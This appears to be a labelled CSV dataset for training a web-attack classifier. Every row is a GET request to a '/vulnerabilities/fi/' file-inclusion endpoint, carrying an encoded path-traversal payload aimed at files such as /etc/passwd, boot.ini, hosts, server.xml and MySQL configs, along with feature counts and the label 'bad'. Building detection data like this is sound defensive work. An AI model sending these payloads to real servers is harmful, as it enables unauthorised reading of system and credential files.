method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÁœ%c0%ae%c0%aeÁœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eð€€¯%2%e%2%eð€€¯%2%e%2%eð€€¯%2%e%2%eð€€¯%2%e%2%eð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^Á¯windowsÁ¯system32Á¯driversÁ¯etcÁ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..À%9v..À%9v..À%9vetcÀ%9vissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%uF025%uff0e%uff0e%uF025%uff0e%uff0e%uF025%uff0e%uff0e%uF025%uff0e%uff0e%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..\..\\..\..\\\boot.ini,,0,4,2,2,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../\..../\..../\..../\..../\..../\etc/\issue,,6,0,0,0,0,6,1,bad
GET,/vulnerabilities/fi/?page=À^À^ÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^%uF025À^À^%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%u2215\..%u2215\..%u2215\..%u2215\..%u2215\..%u2215etc%u2215issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/opt/lampp/logs/error.log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^à€¯À^À^à€¯etcà€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^%uF025windows%uF025system32%uF025drivers%uF025etc%uF025hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA../../../../etc/passwd,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%uF025ÀîÀî%uF025ÀîÀî%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.Á%8sÀ.À.Á%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../Á%pc..../Á%pc..../Á%pcwindowsÁ%pcsystem32Á%pcdriversÁ%pcetcÁ%pchosts,,3,0,0,0,0,3,2,bad
GET,/vulnerabilities/fi/?page=À.À.À%qfÀ.À.À%qfÀ.À.À%qfÀ.À.À%qfÀ.À.À%qfwindowsÀ%qfsystem32À%qfdriversÀ%qfetcÀ%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn%5c%ÀnÀn%5c%ÀnÀn%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae/windows/system32/drivers/etc/hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\{FILE},,0,1,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®%2fø€€€®ø€€€®%2fø€€€®ø€€€®%2fetc%2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%2%f%2%e%2%e%2%f%2%e%2%e%2%f%2%e%2%e%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®Áü€€€€®ü€€€€®Áü€€€€®ü€€€€®ÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®%5cà€®à€®%5cà€®à€®%5cà€®à€®%5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÀ%qfÀîÀîÀ%qfetcÀ%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.Á%pc.../.Á%pcetcÁ%pcpasswd,,2,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%uF025ü€€€€®ü€€€€®%uF025ü€€€€®ü€€€€®%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ0x2fÀþÀþ0x2fÀþÀþ0x2fÀþÀþ0x2fÀþÀþ0x2fÀþÀþ0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.ø€€€¯.../.ø€€€¯.../.ø€€€¯.../.ø€€€¯etcø€€€¯issue,,4,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ/windowsÀ/system32À/driversÀ/etcÀ/hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,3,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror_l,,0,0,0,0,0,0,4,bad
GET,/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini,,7,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??Áœ??Áœ??Áœ??Áœ??Áœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁœÀþÀþÁœÀþÀþÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®%2fÀ®À®%2fÀ®À®%2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.Á?.ÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%u2215ÀîÀî%u2215ÀîÀî%u2215ÀîÀî%u2215ÀîÀî%u2215ÀîÀî%u2215etc%u2215passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..%u2216..%u2216..%u2216..%u2216..%u2216{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..//..//..//..//..//{FILE},,5,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À.À.%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?./?./?./?./?./?./windows/system32/drivers/etc/hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2f%uff0e%uff0e%2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/etc/postfix/mydomains,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..\\..\\..\\..\\..\boot.ini,,0,5,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/usr/local/pureftpd/etc/pureftpd.pdn,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=C:\Program,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%2f%2%e%2%e%2f%2%e%2%e%2f%2%e%2%e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî0x5cÀîÀî0x5cÀîÀî0x5cÀîÀî0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/log/samba,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5%c..%5%c..%5%c..%5%c..%5%c..%5%cboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®\ø€€€®ø€€€®\windows\system32\drivers\etc\hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Áø€€€®ø€€€®Áø€€€®ø€€€®Áø€€€®ø€€€®Áø€€€®ø€€€®ÁetcÁpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=......///......///windows///system32///drivers///etc///hosts,,2,0,0,0,0,2,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216%2e%2e%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®ð€€¯À®À®ð€€¯À®À®ð€€¯À®À®ð€€¯etcð€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%5c%uff0e%uff0e%5c%uff0e%uff0e%5c%uff0e%uff0e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/proc/partitions,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\opt\xampp\logs\error_log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?À/.?À/.?À/.?À/.?À/etcÀ/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../windows/system32/drivers/etc/hosts,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.%5%cÀ.À.%5%cÀ.À.%5%cÀ.À.%5%cÀ.À.%5%cÀ.À.%5%cboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..%uF025..%uF025..%uF025..%uF025..%uF025/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??ÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%u2216etc%u2216passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5%c%2e%2e%5%c%2e%2e%5%c%2e%2e%5%cetc%5%cpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},,0,7,6,3,0,0,0,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®À%qfø€€€®ø€€€®À%qfø€€€®ø€€€®À%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA../../../boot.ini,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%5cü€€€€®ü€€€€®%5cü€€€€®ü€€€€®%5cü€€€€®ü€€€€®%5cetc%5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%uF025\..%uF025\..%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..///..///..///..///..///..///..///boot.ini,,7,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=C:/windows/windowsupdate.log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%5c.../.%5cetc%5cpasswd,,2,0,1,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À/ð€€®ð€€®À/ð€€®ð€€®À/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..Á..Á..Á..Áboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eð€€¯%2%e%2%eð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/\\\..\..\,,0,2,1,1,0,0,0,bad
GET,/vulnerabilities/fi/?page=.../.%c1%9c.../.%c1%9c.../.%c1%9c.../.%c1%9c.../.%c1%9c.../.%c1%9cetc%c1%9cissue,,6,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%bg%qf.../.%bg%qfetc%bg%qfissue,,2,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..//..//..//etc//passwd,,3,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%2f%c0%ae%c0%ae%2f%c0%ae%c0%ae%2fetc%2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..\\..\\..\\..\\..\etc\passwd,,0,5,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À®À®%uF025À®À®%uF025À®À®%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®%u2216à€®à€®%u2216à€®à€®%u2216à€®à€®%u2216à€®à€®%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/À.À.\À.À.\À.À.\À.À.\À.À.\À.À.\À.À.\À.À.\,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..\..\boot.ini,,0,2,1,1,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..0x5c\..0x5c\..0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../conf/server.xml,,8,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..///etc/passwd,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Áð€€®ð€€®Áð€€®ð€€®Áð€€®ð€€®Áð€€®ð€€®ÁetcÁissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%c1%9cÀþÀþ%c1%9cÀþÀþ%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÁ%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../proc/self/fd/8,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?Á%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,6,5,3,0,0,2,bad
GET,/vulnerabilities/fi/?page=C:/windows/system32/unattended.txt,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=C:/mysql/bin/my.ini,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=??Á¯??Á¯??Á¯etcÁ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..../%5%c..../%5%c..../%5%cetc%5%cpasswd,,3,0,0,0,0,3,1,bad
GET,/vulnerabilities/fi/?page=À®À®À\À®À®À\À®À®À\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=///..\..\..\..\..\..\etc///passwd,,0,6,5,3,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},,0,7,6,3,0,0,0,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%5c?.%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.Á%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁ%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%uEFC8windows%uEFC8system32%uEFC8drivers%uEFC8etc%uEFC8hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..../%5%c..../%5%cboot.ini,,2,0,0,0,0,2,0,bad
GET,/vulnerabilities/fi/?page=?.À\?.À\?.À\?.À\?.À\windowsÀ\system32À\driversÀ\etcÀ\hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..Á%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?%c1%9c.?%c1%9c.?%c1%9c.?%c1%9c.?%c1%9c.?%c1%9cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..À¯..À¯..À¯..À¯..À¯..À¯etcÀ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,0,7,6,3,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%5%cÀîÀî%5%cÀîÀî%5%cÀîÀî%5%cÀîÀî%5%cetc%5%cissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=\../\../\../\../\..//etc/passwd,,5,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=///../..//etc/passwd,,2,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%5cð€€®ð€€®%5cð€€®ð€€®%5cetc%5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..../Áœ..../Áœ..../ÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,3,0,0,0,0,3,2,bad
GET,/vulnerabilities/fi/?page=??ð€€¯??ð€€¯etcð€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f,,8,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/apache/logs/access.log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?ð€€¯.?ð€€¯.?ð€€¯.?ð€€¯.?ð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2eÀ¯%2e%2eÀ¯etcÀ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%2fü€€€€®ü€€€€®%2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/.../.../.../.../.../.../.../.../boot.ini,,8,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÀ/ÀîÀîÀ/ÀîÀîÀ/ÀîÀîÀ/ÀîÀîÀ/ÀîÀîÀ/etcÀ/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/À.À.À\À.À.À\À.À.À\À.À.À\À.À.À\À.À.À\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®%2%fÀ®À®%2%fÀ®À®%2%fÀ®À®%2%fÀ®À®%2%fÀ®À®%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯windowsø€€€¯system32ø€€€¯driversø€€€¯etcø€€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.\À.À.\À.À.\À.À.\À.À.\/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.%u2216etc%u2216passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../{FILE},,1,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À.À.%bg%qfÀ.À.%bg%qfÀ.À.%bg%qfÀ.À.%bg%qfÀ.À.%bg%qfÀ.À.%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..0x5c..0x5c..0x5c..0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??Á%pc??Á%pc??Á%pcwindowsÁ%pcsystem32Á%pcdriversÁ%pcetcÁ%pchosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\,,0,6,5,3,0,0,0,bad
GET,/vulnerabilities/fi/?page=..../ð€€¯etcð€€¯passwd,,1,0,0,0,0,1,2,bad
GET,/vulnerabilities/fi/?page=.//..///etc/passwd,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??à€¯etcà€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.%2%f.../.%2%f.../.%2%f.../.%2%f.../.%2%fetc%2%fpasswd,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\../\../\../boot.ini,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../..../..../..../..../....//etc/passwd,,6,0,0,0,0,6,2,bad
